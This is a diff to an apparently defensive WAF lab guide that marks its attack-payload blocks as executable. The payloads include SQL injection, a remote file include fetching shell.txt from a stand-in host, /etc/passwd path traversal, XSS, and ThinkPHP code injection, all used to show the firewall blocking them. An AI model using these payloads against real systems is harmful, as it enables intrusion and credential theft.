@@ -140,51 +140,61 @@ Protect WAF to protect your applications from attacks.
 Use these by appending them to the application URL (e.g., `http://$nginx_ingress/`):
 
 *SQL Injection* +
+[source,sh,role=execute]
 ----
 ?hfsagrs=-1+UNION+SELECT+user,password+FROM+users--
 ----
 
 *Remote File Include (RFI)* +
+[source,sh,role=execute]
 ----
 ?hfsagrs=php://filter/resource=http://example.com/shell.txt
 ----
 
 *Command Execution* +
+[source,sh,role=execute]
 ----
 ?hfsagrs=/proc/self/environ
 ----
 
 *HTTP Parser Attack* +
+[source,sh,role=execute]
 ----
 ?XDEBUG_SESSION_START=phpstorm
 ----
 
 *Path Traversal (Predictable Resource Location)* +
+[source,sh,role=execute]
 ----
 /lua/login.lua?referer=google.com/&hfsagrs=../../../../../../../../etc/passwd
 ----
 
 *Cross-Site Scripting (XSS)* +
+[source,sh,role=execute]
 ----
 /lua/login.lua?referer=google.com/&hfsagrs="onmouseover=alert('XSS')"
 ----
 
 *Information Leakage Probe* +
+[source,sh,role=execute]
 ----
 /lua/login.lua?referer=google.com/&hfsagrs=efw
 ----
 
 *Forced Browsing (Parser Attack)* +
+[source,sh,role=execute]
 ----
 /dana-na/auth/url_default/welcome.cgi
 ----
 
 *ThinkPHP Code Injection* +
+[source,sh,role=execute]
 ----
 /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP
 ----
 
 *Header-based XSS (via Cookie)* +
+[source,sh,role=execute]
 ----
 Cookie: hfsagrs='"><script>alert("XSS")</script>'
 ----
@@ -201,7 +211,7 @@ Execute the attack by running the following bash script from the
 terminal window:
 ====
 
-[source,bash]
+[source,sh,role=execute]
 ----
 #!/bin/bash
 echo "------------------------------"
